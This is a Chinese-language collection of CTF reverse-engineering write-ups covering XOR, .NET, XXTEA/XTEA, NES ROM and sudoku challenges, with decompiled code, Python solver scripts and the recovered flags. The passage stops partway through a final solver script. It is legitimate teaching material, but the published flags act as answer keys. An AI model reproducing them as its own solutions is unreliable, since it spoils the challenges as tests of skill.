    <content type="html"><![CDATA[<h1 id="逆向工程-（10题）"><a href="#逆向工程-（10题）" class="headerlink" title="逆向工程 （10题）"></a>逆向工程 （10题）</h1><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="easy-reverse（python反编译）bugkuctf"><a href="#easy-reverse（python反编译）bugkuctf" class="headerlink" title="easy_reverse（python反编译）bugkuctf"></a>easy_reverse（python反编译）bugkuctf</h2><p><img src="/./img/fIkxkfKzg4ExsOqv/1740977315009-12523273-a9a2-4b1f-a210-728c167d22e7-381868.png" alt="1740977315009-12523273-a9a2-4b1f-a210-728c167d22e7.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1740977452894-bff09cdc-aa7d-46fe-aaba-82333148cc3b-234950.png" alt="1740977452894-bff09cdc-aa7d-46fe-aaba-82333148cc3b.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1740977526408-05b225e4-05b7-4408-91ff-473d227700b5-080288.png" alt="1740977526408-05b225e4-05b7-4408-91ff-473d227700b5.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1740977628433-4bfccc3c-fa25-4d59-90c2-dd6483aad3d0-328330.png" alt="1740977628433-4bfccc3c-fa25-4d59-90c2-dd6483aad3d0.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1740977665245-7d539bc9-d042-4435-8043-793a8df1e703-067626.png" alt="1740977665245-7d539bc9-d042-4435-8043-793a8df1e703.png"></p><h2 id="easy-XOr-Susctf"><a href="#easy-XOr-Susctf" class="headerlink" title="easy_XOr(Susctf)"></a>easy_XOr(Susctf)</h2><p>int __fastcall main(int argc, const char **argv, const char **envp)</p><p>{</p><p>  char v4; &#x2F;&#x2F; [rsp+Fh] [rbp-91h]</p><p>  int v5; &#x2F;&#x2F; [rsp+10h] [rbp-90h]</p><p>  int i; &#x2F;&#x2F; [rsp+14h] [rbp-8Ch]</p><p>  int v7; &#x2F;&#x2F; [rsp+18h] [rbp-88h]</p><p>  int v8[24]; &#x2F;&#x2F; [rsp+20h] [rbp-80h]</p><p>  char s[24]; &#x2F;&#x2F; [rsp+80h] [rbp-20h] BYREF</p><p>  unsigned __int64 v10; &#x2F;&#x2F; [rsp+98h] [rbp-8h]</p><p>  v10 &#x3D; __readfsqword(0x28u);</p><p>  v8[0] &#x3D; 83;</p><p>  v8[1] &#x3D; 116;</p><p>  v8[2] &#x3D; 113;</p><p>  v8[3] &#x3D; 96;</p><p>  v8[4] &#x3D; 112;</p><p>  v8[5] &#x3D; 99;</p><p>  v8[6] &#x3D; 125;</p><p>  v8[7] &#x3D; 78;</p><p>  v8[8] &#x3D; 87;</p><p>  v8[9] &#x3D; 103;</p><p>  v8[10] &#x3D; 57;</p><p>  v8[11] &#x3D; 110;</p><p>  v8[12] &#x3D; 104;</p><p>  v8[13] &#x3D; 82;</p><p>  v8[14] &#x3D; 102;</p><p>  v8[15] &#x3D; 106;</p><p>  v8[16] &#x3D; 113;</p><p>  v8[17] &#x3D; 32;</p><p>  v8[18] &#x3D; 123;</p><p>  v8[19] &#x3D; 125;</p><p>  v8[20] &#x3D; 115;</p><p>  v8[21] &#x3D; 104;</p><p>  v5 &#x3D; 0;</p><p>  v4 &#x3D; 1;</p><p>  puts(“Mercy: What do you want to tell me?”);</p><p>  scanf(“%s”, s);</p><p>  v7 &#x3D; strlen(s);</p><p>  if ( v7 !&#x3D; 22 )</p><pre><code class="hljs">puts(&quot;You Are Defented;&quot;);</code></pre><p>  for ( i &#x3D; 0; i &lt; v7; ++i )</p><p>  {</p><pre><code class="hljs">if ( v5 )&#123;  if ( v8[i] != (i ^ s[i]) )    v4 = 0;  v5 = 0;&#125;else&#123;  if ( v8[i] != (i ^ s[i]) )    v4 = 0;  v5 = 1;&#125;</code></pre><p>  }</p><p>  if ( v4 )</p><pre><code class="hljs">puts(&quot;Heros never die~Victory~&quot;);</code></pre><p>  else</p><pre><code class="hljs">puts(&quot;You Are Defented;&quot;);</code></pre><p>  return 0;</p><p>}</p><p><img src="/./img/fIkxkfKzg4ExsOqv/1740978677264-a80fb091-9ae3-4abf-9a94-b70692408b9c-831788.png" alt="1740978677264-a80fb091-9ae3-4abf-9a94-b70692408b9c.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p> 自己写个脚本提取一下数据再解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=[199,  69, 128,  83,   0,   0,   0, 199,  69, 132,<br>  116,   0,   0,   0, 199,  69, 136, 113,   0,   0,<br>    0, 199,  69, 140,  96,   0,   0,   0, 199,  69,<br>  144, 112,   0,   0,   0, 199,  69, 148,  99,   0,<br>    0,   0, 199,  69, 152, 125,   0,   0,   0, 199,<br>   69, 156,  78,   0,   0,   0, 199,  69, 160,  87,<br>    0,   0,   0, 199,  69, 164, 103,   0,   0,   0,<br>  199,  69, 168,  57,   0,   0,   0, 199,  69, 172,<br>  110,   0,   0,   0, 199,  69, 176, 104,   0,   0,<br>    0, 199,  69, 180,  82,   0,   0,   0, 199,  69,<br>  184, 102,   0,   0,   0, 199,  69, 188, 106,   0,<br>    0,   0, 199,  69, 192, 113,   0,   0,   0, 199,<br>   69, 196,  32,   0,   0,   0, 199,  69, 200, 123,<br>    0,   0,   0, 199,  69, 204, 125,   0,   0,   0,<br>  199,  69, 208, 115,   0,   0,   0, 199,  69, 212,<br>  104,   0,   0,   0]<br>b=[]<br>k=0<br>for i in range(len(a)):<br>    if(a[i]==0):<br>        continue<br>    else:<br>        if(k!=3):<br>            k+=1<br>            continue<br>        else:<br>            b.append(a[i])<br>            k=0<br>#print(b,len(b))<br>v5=0<br>v4=1<br>for i in range(22):<br>    if(v5==1):<br>        b[i]=b[i]^i<br>        v5=0<br>    else:<br>        b[i]=b[i]^i<br>        v5=0<br>    print(chr(b[i]),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h2 id="baby-re-强网先锋-net逆向"><a href="#baby-re-强网先锋-net逆向" class="headerlink" title="baby_re(强网先锋)net逆向"></a>baby_re(强网先锋)net逆向</h2><p><img src="/./img/fIkxkfKzg4ExsOqv/1740978789540-6afedada-be0e-4aa8-b406-671f8f4d68a7-168772.png" alt="1740978789540-6afedada-be0e-4aa8-b406-671f8f4d68a7.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1740979093577-f57100d1-c7c1-4a4f-aaf4-621565c01ded-487984.png" alt="1740979093577-f57100d1-c7c1-4a4f-aaf4-621565c01ded.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1740979429774-a27ec7bd-00a0-4ed4-8081-30510b3fe6d1-246542.png" alt="1740979429774-a27ec7bd-00a0-4ed4-8081-30510b3fe6d1.png"></p><p>还有一种方法是修改判断次数，修改num，调试后得到flag</p><p><img src="/./img/fIkxkfKzg4ExsOqv/1740979941838-de3ee6d3-1bb7-4cc6-9a7d-214fc162d4de-583223.png" alt="1740979941838-de3ee6d3-1bb7-4cc6-9a7d-214fc162d4de.png"></p><h2 id="DASCTF-2024最后一战｜寒夜破晓，冬至终章-tryre"><a href="#DASCTF-2024最后一战｜寒夜破晓，冬至终章-tryre" class="headerlink" title="[DASCTF 2024最后一战｜寒夜破晓，冬至终章]tryre"></a><font style="color:rgb(33, 37, 41);">[DASCTF 2024最后一战｜寒夜破晓，冬至终章]tryre</font></h2><p><img src="/./img/fIkxkfKzg4ExsOqv/1740979985390-12da8882-2f22-4e57-955e-2e395890a007-113789.png" alt="1740979985390-12da8882-2f22-4e57-955e-2e395890a007.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741066532680-7379b308-bf2e-4177-9e27-d34ae1c69e7d-726726.png" alt="1741066532680-7379b308-bf2e-4177-9e27-d34ae1c69e7d.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741066682709-60a5d2e8-d428-4eb1-942c-19855c1eda0b-687799.png" alt="1741066682709-60a5d2e8-d428-4eb1-942c-19855c1eda0b.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741066761427-6dac6017-b06a-43e4-a202-f6ac148323a7-354885.png" alt="1741066761427-6dac6017-b06a-43e4-a202-f6ac148323a7.png"></p><p>DASCTF{454646fa-2462-4392-82ea-5f809ad5ddc2}</p><h2 id="DASCTF-2024最后一战｜寒夜破晓，冬至终章-刻板印象re"><a href="#DASCTF-2024最后一战｜寒夜破晓，冬至终章-刻板印象re" class="headerlink" title="[DASCTF 2024最后一战｜寒夜破晓，冬至终章]刻板印象re"></a><font style="color:rgb(33, 37, 41);">[DASCTF 2024最后一战｜寒夜破晓，冬至终章]刻板印象re</font></h2><p><img src="/./img/fIkxkfKzg4ExsOqv/1741067788345-54d5222e-ed2d-424a-a1e0-6f292075463f-782260.png" alt="1741067788345-54d5222e-ed2d-424a-a1e0-6f292075463f.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741067953657-7c1a018b-6e60-4b6a-91db-ccf6b0338f1a-121039.png" alt="1741067953657-7c1a018b-6e60-4b6a-91db-ccf6b0338f1a.png"></p><p>len&#x3D;48 </p><p>猜测sub_401023为copy函数</p><p>看一下sub_40126C这个加密函数</p><p>下面是比较函数</p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741067987602-c7fa999a-c3bd-41bb-ade3-2416ba4391d3-523693.png" alt="1741067987602-c7fa999a-c3bd-41bb-ade3-2416ba4391d3.png"></p><p>a1就是数据串的初始地址</p><p>密文</p><p>byte_42F090&#x3D;”aughter_is_poison_to_fear”;</p><p><font style="color:rgb(77, 77, 77);">加密逻辑在sub_401740，但是401795处有修改堆栈返回值的代码，IDA误以为后面没有代码了，nop掉这部分，就可以看到完整的伪C代码。</font></p><p><font style="color:rgb(77, 77, 77);">我说怎么原来解出来是乱码</font></p><p><font style="color:rgb(77, 77, 77);">nop掉这部分</font></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741069568805-cd41cea8-c021-4bb8-8de5-36e83062dcab-344610.png" alt="1741069568805-cd41cea8-c021-4bb8-8de5-36e83062dcab.png"></p><h3 id="方法1、nop掉中间部分，然后修改上面机器码跳转到下面的指令"><a href="#方法1、nop掉中间部分，然后修改上面机器码跳转到下面的指令" class="headerlink" title="方法1、nop掉中间部分，然后修改上面机器码跳转到下面的指令"></a>方法1、nop掉中间部分，然后修改上面机器码跳转到下面的指令</h3><p><img src="/./img/fIkxkfKzg4ExsOqv/1741071536293-0aced7b9-5f95-453c-95e8-90065324b866-296386.png" alt="1741071536293-0aced7b9-5f95-453c-95e8-90065324b866.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741071593504-4f420b6d-2dba-4e05-8d75-63b0cf80697f-331015.png" alt="1741071593504-4f420b6d-2dba-4e05-8d75-63b0cf80697f.png"></p><p>发现是XXTEA</p><p><font style="color:rgb(77, 77, 77);">delta是0x11451419</font></p><p><font style="color:rgb(77, 77, 77);">密钥是{What_is_this_?}</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">XTEAdecrypt</span>(<span class="hljs-params">rounds, v, k</span>):<br>    v0 = v[<span class="hljs-number">0</span>]<br>    v1 = v[<span class="hljs-number">1</span>]<br>    delta = <span class="hljs-number">0x9E3779B9</span><br>    x = delta * rounds<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>])<br>        v1 = v1 &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        x -= delta<br>        x = x &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (x + k[x &amp; <span class="hljs-number">3</span>])<br>        v0 = v0 &amp; <span class="hljs-number">0xFFFFFFFF</span><br><span class="hljs-comment">#    v[0] = v0</span><br><span class="hljs-comment">#    v[1] = v1</span><br>    <span class="hljs-keyword">return</span> [v0,v1]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i^j <span class="hljs-keyword">for</span> i,j <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a,b)])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shift</span>(<span class="hljs-params">z, y, x, k, p, e</span>):<br>    <span class="hljs-keyword">return</span> ((((z &gt;&gt; <span class="hljs-number">5</span>) ^ (y &lt;&lt; <span class="hljs-number">2</span>)) + ((y &gt;&gt; <span class="hljs-number">3</span>) ^ (z &lt;&lt; <span class="hljs-number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="hljs-number">3</span>) ^ e] ^ z)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">XXTEAdecrypt</span>(<span class="hljs-params">v, k</span>):<br>    delta = <span class="hljs-number">0x11451419</span><br>    n = <span class="hljs-built_in">len</span>(v)<br>    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // (n)<br>    x = (rounds * delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    y = v[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>        e = (x &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>            z = v[p - <span class="hljs-number">1</span>]<br>            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            y = v[p]<br>        p -= <span class="hljs-number">1</span><br>        z = v[n - <span class="hljs-number">1</span>]<br>        v[<span class="hljs-number">0</span>] = (v[<span class="hljs-number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        y = v[<span class="hljs-number">0</span>]<br>        x = (x - delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> v<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    key=[]<br>    keys=<span class="hljs-string">b&#x27;&#123;What_is_this_?&#125;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        key.append(struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>,keys[i*<span class="hljs-number">4</span>:i*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>])<br>    enc=<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;18091C14371D162D3C05163E0203102C0E313915043A39030D132B3E06083700170B001D1C0016060717300330060A71&#x27;</span>)<br>    enc=xor(enc,<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;8f6ca63f943df5d9366651d7662fb38fc0619ecee9d7e1bf13141614c2e7c33a7f94a1e7240ea75cd377fe4f11dc6923&#x27;</span>))<br>    encrypted=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)//<span class="hljs-number">4</span>):<br>        encrypted.append(struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>,enc[i*<span class="hljs-number">4</span>:i*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>])<br>    decrypted = XXTEAdecrypt(encrypted, key)<br>    flag=<span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(decrypted)):<br>        flag+=struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>,decrypted[i])<br>    key = [<span class="hljs-number">0x756F797B</span>,<span class="hljs-number">0x6E69665F</span>,<span class="hljs-number">0x74695F64</span>,<span class="hljs-number">0x7D3F215F</span>]<br>    rounds = <span class="hljs-number">32</span><br>    enc=flag<br>    enc=xor(enc,<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;DA3023E3DC398260A54468C2437ABBE450E102C28159EA1EC68B7138278394D8F48D1A2A568A4AD454DC243FB9ED7B9A&#x27;</span>))<br>    encrypted=[]<br>    flag=<span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)//<span class="hljs-number">4</span>):<br>        encrypted.append(struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>,enc[i*<span class="hljs-number">4</span>:i*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encrypted)//<span class="hljs-number">2</span>):<br>        decrypted = XTEAdecrypt(rounds,encrypted[i*<span class="hljs-number">2</span>:i*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>], key)<br>        x=struct.pack(<span class="hljs-string">&#x27;&lt;2I&#x27;</span>,decrypted[<span class="hljs-number">0</span>],decrypted[<span class="hljs-number">1</span>])<br>        flag+=x<br>    <span class="hljs-built_in">print</span>(xor(flag,<span class="hljs-string">b&#x27;Laughter_is_poison_to_fearLaughter_is_poison_to_fear&#x27;</span>))<br><span class="hljs-comment">#DASCTF&#123;You_come_to_me_better_than_all_the_good.&#125;</span><br><br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);"></font></p><h2 id="例题xctf-chase（nes逆向）"><a href="#例题xctf-chase（nes逆向）" class="headerlink" title="例题xctf chase（nes逆向）"></a><font style="color:rgb(77, 77, 77);">例题xctf chase（nes逆向）</font></h2><p><font style="color:rgb(77, 77, 77);">mapper为0</font></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741419256964-69856734-4fc1-42ab-9929-d319c6c1fe01-021251.png" alt="1741419256964-69856734-4fc1-42ab-9929-d319c6c1fe01.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741418395482-843dfd13-99ea-4389-9718-783a3594f4eb-067204.png" alt="1741418395482-843dfd13-99ea-4389-9718-783a3594f4eb.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741419165702-57bad6fd-0b9c-4cac-a85f-f4fe2a9d7f28-376981.png" alt="1741419165702-57bad6fd-0b9c-4cac-a85f-f4fe2a9d7f28.png"></p><p><font style="color:rgb(77, 77, 77);">看到机器码从8000</font></p><p><font style="color:rgb(77, 77, 77);">ida用二进制打开 以6502的形式</font></p><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a><font style="color:rgb(77, 77, 77);">flag01</font></h3><p><img src="/./img/fIkxkfKzg4ExsOqv/1741419767757-5cfb67c8-a43c-4092-b050-7fa0f8a78105-477237.png" alt="1741419767757-5cfb67c8-a43c-4092-b050-7fa0f8a78105.png"></p><p><font style="color:rgb(77, 77, 77);">可以直接ce开挂, </font></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741420056271-4f8d75df-b34b-48b9-8325-9b2cb0e792dc-229296.png" alt="1741420056271-4f8d75df-b34b-48b9-8325-9b2cb0e792dc.png"></p><p><font style="color:rgb(77, 77, 77);">TPCTF{D0_Y0U_L1KE_</font></p><p><font style="color:rgb(77, 77, 77);">也可用FCEUX自带的cheat改动</font><img src="/./img/fIkxkfKzg4ExsOqv/1741709266224-553180e2-fb39-44d6-a16b-2e2d6e5e2545-267670.png" alt="1741709266224-553180e2-fb39-44d6-a16b-2e2d6e5e2545.png"></p><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a><font style="color:rgb(77, 77, 77);">flag02</font></h3><p><font style="color:rgb(77, 77, 77);">法1</font></p><p>经过不断调试发现AB对应的值和场景有关，每个场景对应值固定且范围普遍在0-60之间，那么尝试爆破，调整AB的值，改内存时发现会有随机性，相同的值不保证每次的闪烁结果相同，这里是尝试到0x15时看到flag2：</p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741709756176-dbd26352-cb02-462d-8549-d69b24d71089-345374.png" alt="1741709756176-dbd26352-cb02-462d-8549-d69b24d71089.png"></p><p><font style="color:rgb(77, 77, 77);">法2</font></p><p><font style="color:rgb(85, 85, 85);background-color:rgb(250, 250, 250);">第二段有点misc的感觉，猜测也是在内存里面只不过不会加载到屏幕上，由于每段flag开头都会有THE FLAG PT我们搜索这几个字符的tile 34 28 25,一共发现两个其实一个是第一段flag，tile D2就是代表字符2 D1也就是字符1</font></p><p><font style="color:rgb(85, 85, 85);background-color:rgb(250, 250, 250);">这段是flag1</font></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741710181978-c9534bf4-ebe6-4cf7-8cd9-45a6069a9013-345940.png" alt="1741710181978-c9534bf4-ebe6-4cf7-8cd9-45a6069a9013.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741710552358-b2720dac-228b-4429-bc6f-d7ad34761324-840401.png" alt="1741710552358-b2720dac-228b-4429-bc6f-d7ad34761324.png"></p><p><font style="color:rgb(77, 77, 77);">第二段是flag2</font></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741710162833-33cee26d-da76-4d11-87dc-0609309ade76-743486.png" alt="1741710162833-33cee26d-da76-4d11-87dc-0609309ade76.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plain">import binascii<br><br>data = &quot;34282500262C21270030340ED200262F3200392F35002933000112A4000118302C2139D12ED93DD6202DD3333D00019ABDADAD6D000103B9ADAD6E000103B9ADAD6E0001030D01030001100001000F0F0F0F0F1C2C3C0F1222320F1424340F1132300F1C2C3C0F0927380F1121310F1132300F1121310F0727380F1323330F1132300F1525350F0527380F1323330F1132300F1929390F0B27380F1727370F1132300F1626360F0727380F1828380F0F29300F0F26300F0F24300F0F213000FF490008FF4A0000074B0008074C008000FF4D0108FF4E0100074F01080750018000FF4D0208FF4E0200074F02080750028000FF4D0308FF4E0300074F03080750038077F488F499F4AAF4B0E717F4E1E827F4ACEA37F4C8EC37F448EF37F49BF217F4280044280044280044280044204F10205010205110FF2C2536252C1A000027252D331A0000000F000000002C293625331A000304037A7B7C7D7C7D7E7F80819A9B867B8788898A8B8C8D7D807D909192939495967F94959C9500000000000058E5ADE40BE7FEE48D1C038E1D038D23038E240388B9FFFF8D2D0388B9FFFF8D2C038C2F0320FFFFA0FFD0E860000000000000&quot;<br><br>data = binascii.a2b_hex(data)<br><br>table = &#123;&#125;<br>str_1 = ord(&quot;A&quot;)<br>for i in range(0x21,0x3B):<br>    table[i] = chr(str_1)<br>    str_1 += 1<br>table[0x20] = &quot;@&quot;<br>table[0] = &quot; &quot;<br>table[0x3d] = &quot;_&quot;<br>str_1 = ord(&quot;0&quot;)<br>for i in range(0xD0,0xDA):<br>    table[i] = chr(str_1)<br>    str_1 += 1<br>flag = &quot;&quot;<br><br>for i in range(len(data)):<br>    for key,value in table.items():<br>        if data[i] == key:<br>            flag += value<br>print(flag)<br></code></pre></td></tr></table></figure><p><img src="/./img/fIkxkfKzg4ExsOqv/1741710467489-0446e5ee-e3bc-4afd-a9bc-27269875e8eb-704799.png" alt="1741710467489-0446e5ee-e3bc-4afd-a9bc-27269875e8eb.png"></p><p><font style="color:rgb(77, 77, 77);">THE FLAG PT2 FOR YOU IS  PLAY1N9_6@M3S_       LBRDTRPLGXAQRPAQGXCSRPEUGXCSRPIYGXGWRPFVGXHXIPFPDPAP            GWWWH H H H @@@LEVEL  GEMS       LIVES       CDMLO@0      </font></p><h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a><font style="color:rgb(77, 77, 77);">flag03</font></h3><p><font style="color:rgb(77, 77, 77);">看ppu viewer</font></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1741708666856-c2b8147d-30a2-4fe3-91ba-9775a25f2426-830889.png" alt="1741708666856-c2b8147d-30a2-4fe3-91ba-9775a25f2426.png"></p><p><font style="color:rgb(77, 77, 77);">ON_Y0UR_N3S?}</font></p><p><font style="color:rgb(77, 77, 77);"></font></p><p><font style="color:rgb(77, 77, 77);">FLAG：TPCTF{D0_Y0U_L1KE_PLAY1N9_6@M3S_ ON_Y0UR_N3S?}</font></p><h2 id="A-game-MOECTF"><a href="#A-game-MOECTF" class="headerlink" title="A_game-MOECTF"></a><font style="color:rgb(77, 77, 77);">A_game-MOECTF</font></h2><p><font style="color:rgb(77, 77, 77);">看了一下是个数独题目</font></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1748414863970-eee04499-9ae7-495c-80cf-6379bb4c403d-307603.png" alt="1748414863970-eee04499-9ae7-495c-80cf-6379bb4c403d.png"></p><p><font style="color:rgb(77, 77, 77);">提取box，顺便整理一下</font></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1748415326666-9f8543c6-d1a1-4bb9-9c55-af44a9198b9d-011172.png" alt="1748415326666-9f8543c6-d1a1-4bb9-9c55-af44a9198b9d.png"></p><p><a href="https://sudokusolving.bmcx.com/">https://sudokusolving.bmcx.com/</a></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1748415414031-78f0bc0f-c726-4d51-8089-5c774b6c3a01-053894.png" alt="1748415414031-78f0bc0f-c726-4d51-8089-5c774b6c3a01.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">box=[<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">5</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">4</span>,   <span class="hljs-number">3</span>,   <span class="hljs-number">6</span>,   <span 